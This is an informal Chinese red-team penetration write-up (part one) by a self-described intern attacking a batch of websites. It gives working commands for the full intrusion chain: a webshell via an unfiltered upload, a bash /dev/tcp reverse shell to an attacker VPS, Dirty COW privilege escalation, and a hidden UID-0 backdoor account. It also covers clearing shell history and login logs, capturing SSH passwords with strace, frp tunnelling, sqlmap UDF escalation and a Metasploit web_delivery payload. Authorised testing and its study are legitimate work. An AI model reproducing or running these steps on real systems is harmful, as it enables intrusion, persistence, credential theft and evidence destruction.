红队实战攻击之随缘测站
（上） 安
- SecPulse.COM |
全脉搏
“ 序⾔
序⾔
⼤家好，作为⼀个练习时⻓两年半的安全实习⽣，这⼏天
⼤佬给了我⼀批⽹站让我练练⼿。跟着⼤佬的步骤慢慢学
习，争取早⽇出道，呸呸，⼝误，早⽇成为⼤佬！
正⽂
随缘搜集资产
⼤佬们都是 0day、社⼯、钓⻥之类的，本⼈菜⻦⼀只，
勿喷，看到⼀⼤堆资产，本着随缘的标准，开始了⼀系列
的批量操作。
⾸先开始资产搜集，ip 和域名信息都已经有了，这⾥我
将所有的 ip 放到 goby。(附上官⽹地址
https://gobies.org/)
这是⼀个资产管理软件，能⾃动扫描端⼝以及识别指纹信
息，漏洞扫描，密码爆破等等，还可以加载⼀些⼩插件，
还是挺强的。为提⾼效率，这⾥只探测⼀些关键性端⼝。
同时将域名放到 sql 批量注⼊⼯具⾥⾯，加上⼀些简单的
注⼊绕过，有条件的可以加上代理池。
探测完毕，因为给的⽬标站点不算少，其中肯定会触发到
⼀些防护软件的拦截规则，刚好能帮我们过滤掉⼀部分难
啃的站点，所以能检测到的相对来说会好利⽤⼀点（俗话
说的好，柿⼦还是得挑软的来捏嘛）。
根据扫描出来的结果，将探测到的 21，22，3389 和数
据库的端⼝分别整合⼀下，加载字典爆破⼀波。还看到有
struts2 框架，上 struts2poc 扫⼀波。做完以上的操作
之后，都没有测出漏洞，不要⽓馁，这种情况很正常，要
是漏洞这么容易找到，那就没什么成就感了。
下⾯就开始测 web，点开 web 检测，可以查看已扫描到
的全部资产，点链接符号即可跳到⽹站，⼀个⼀个进⾏测
试。
再⽤ fofa 的浏览器插件，探测⼀下旁站资产。接下来的
事，就是找后台，找注册登陆点，密码爆破，注⼊，框架
漏洞等等。主站不⾏就去旁站再相同的操作做⼀遍。（现
在⽹上有批量注⼊，批量找后台，批量爆破后台⼝令的⼀
些脚本，但是每个⽹站的复杂程度都不⼀样，所以到这⼀
步还是⼿⼯靠谱）。
经过漫⻓的重复操作，找到⼀个供应商注册登陆的，这种
接⼝⼀般是要⼈⼯审核的，但是秉着不能放过任何⼀个⼩
细节的⼼态，还是先注册试试，诶嘿，⾃动登录，有点意
思～
进到后台，有两个上传点，都测⼀下，祭出 burp ⼤杀
器！！！
改⼀下包，果不其然，没有限制，没有⼀点点防备，也没
有⼀丝顾虑，你就这样出现～
把数据包返回的路径复制下来，冰蝎连接成功。
好了，外⽹拿 shell 基本上就这样了，只要有耐⼼，总能
找得到，拿到 shell 的这⼀刻，⼀切的疲惫都随着多巴胺
的传递烟消云散～
认认真真的维持据点
⾔归正传，先看⼀下权限，查看权限为 www，权限有点
⼩。
uname -a 查看⼀下版本号，⼤于 2.6.22，可以试试脏
⽜提权。
不知道是不是我冰蝎问题，输⼊命令⽼是卡死，先做个反
弹吧。
Vps监听⼀下 ：nc -lvvp 8080
被控制的主机：bash -i >& /dev/tcp/vps的ip地址/8080 0>&1
反弹成功之后，在冰蝎⾥上传脏⽜提权⼯具。
./dirty password
等了差不多 3 分钟，出现下图的内容之后即提权成功，
拿着账号密码去登陆即可。
账号：firefart
密码：password
登陆之后不要急，先隐藏⼀下⾃⼰的操作，禁⽌ history
记录我的输⼊的命令。
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTL
将备份的 / tmp/passwd.bak，替换 / etc/passwd。还
原 root 账号。
看了下 shadow ⾥ root 账号的密码，没有解出来，那就
创建⼀个 root 权限的账号吧。
useradd -p “密码” db -o -u 0 -g root
Cat /etc/passwd 查看⼀下，新建成功。
⽤ db 账号登陆，whoami 查看下权限。
对了，忘记看了 w 查看⼀下当前登陆⽤户，发现没有其
他⼈在线。
last 查看登陆记录，发现管理员这⼏天都有登陆过。
清理⼀波⽇志先。
echo ""> /var/log/wtmp 清空登陆⽇志
echo ""> /var/log/btmp 清空登陆失败⽇志
echo ""> ~/.bash_history 清除history⽇志
突然断开连接。
隐藏⾃⼰的登陆信息连 ssh 上去再看看，发现是管理员
上线了，先战术性撤退。
ssh -T PI:EMAIL /bin/bash -i
⼩⼼翼翼的横向拓展
账号没有被删，还好，做⼀下痕迹清理还是很有必要的。
0v0 俗话说的好，来都来了，不做点啥，那都对不起管
理员对我们的信任，那就先接个代理吧。
正向代理试了⼀下，端⼝连接不上，看来是被防⽕墙给拦
了，试试反向连接。⽤了 ew，不是很稳定，数据传输⼤
⼀点就会断，还是⽤ frp 吧，顺便⽤内置的 stcp 模块加
密⼀下流量。
上传 frp 到控制机：
scp C:tools4.端⼝代理frpfrp_0.33.0_linux_amd64.tar.gz d
vps 上配置完服务端 frps.ini 后启⽤ nohup ./frps -c
frps.ini &
控制端上配置客户端 frpc.ini 后，nohup ./frpc -c
frpc.ini &
本机配置 ./frps -c frps.ini
接⼊ goby，挂上代理，⼀键扫描内⽹⽹段，探测出来的
漏洞不是很多，探测资产还是很强的！
顺便监听⼀下 ssh，等管理员上线就能抓到他的密码。
strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --li
资产探测的差不多了，漏洞扫描的还差了点，开了不少
445 端⼝，直接⽤ msf 扫⼀下 ms17-010 试试。如下
图，这就是最初向往的⿊阔感 jio 叭。
好吧，⼀个都没有，ms12-020 和 ms17-010 也没打成
功...... 以前看各位⼤佬的⽂章进内⽹ rdp 和 smb 漏洞就
是⼀把梭，差点怀疑是我 msf 的问题，结果在他服务器
上装了个 msf 还是⼀样的，放弃了，并没有那么简单，
得换个思路。
翻⼀翻密码，thinkphp 的框架，太多配置⽂件了，翻到
吐，找到⼀个 config，⾥⾯还是空的，不过看到了命名
规则， grep -ri "DB_USER" 找到了数据库的账号。
查看这个路径，好的，获取到管理员明⽂账号密码（⾮
root 账号）。
连接成功。
能看到其他的数据库，权限很⼤，读⼀波密码，拿到了⼏
个账号密码包括 root 密码，去解⼀下密，成功！
把获取到的账号密码加载进去去撞库试试，拿到了⼀台主
机（另⼀个就是我已经拿到的主机），到 goby ⾥⾯看了
下资产，是台 windows 的主机，很幸福～
⼀键连接 root，看到⾥⾯有域名和账号密码，是个 oa
系统，东⻄还挺多的。
然后⽹站挂了。。等到晚上终于可以连了，不过代理出问
题了，整了半天，原来是⾃⼰的 vpn 出问题了，换了个
节点之后，frp 连接 socks5 成功。继续早上拿到的账号
密码，mysql ⼀键连接数据库。
python sqlmap.py -d mysql://root:#password@192.168.xx.
（此命令会⾃动 udf 提权）
执⾏这条命令需要先安装两个插件。
pip install PyMySQL
pip instal sqlalchemy
拿到 os-shell 之后，执⾏命令。喵喵喵？（⼼态炸裂）
然后多按了⼏次回⻋键，连接次数过多，ip 被锁定了，
好的，这条路断了 - -
所以做渗透的⼼态得好... 不说了，去楼梯⼝冷静冷静
先。
再次查看⼀下 ssh 监听，管理员也⼀直没有上线，⾏叭
⾏叭，管理员不管我，那我继续回到 goby 查看下内⽹的
⽹站，挨个试试 web 端，许久之后...
功夫不负有⼼⼈，admin/123456 进去了⼀个虚拟化系
统，显示有 21 台计算机。赚了，弱⼝令⼤法好！
Msf ⽣成反弹 windows 的 powershell。
use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.xx.xx
set lport 5101
set srvport 5202
set uripath /
run
然后... 没有弹回来，未完待续...
总结
利⽤ goby 搜集资产信息，利⽤⼯具筛选出脆弱资产。拿
到权限先隐藏踪迹，维持权限，再清理⼀些操作记录。想
办法在主机搜集账号密码，资产等信息。linux 可以尝试
抓取 ssh 信息。然后再看看内⽹的资产，拿搜集到的账
号密码去爆破，不然未授权漏洞，提权漏洞，exp，web
漏洞等等。好了，不说了，我去买包辣条压压惊，等我打
下来再出后续。
全⽂完
本⽂由 简悦 SimpRead 优化，⽤以提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看详细说明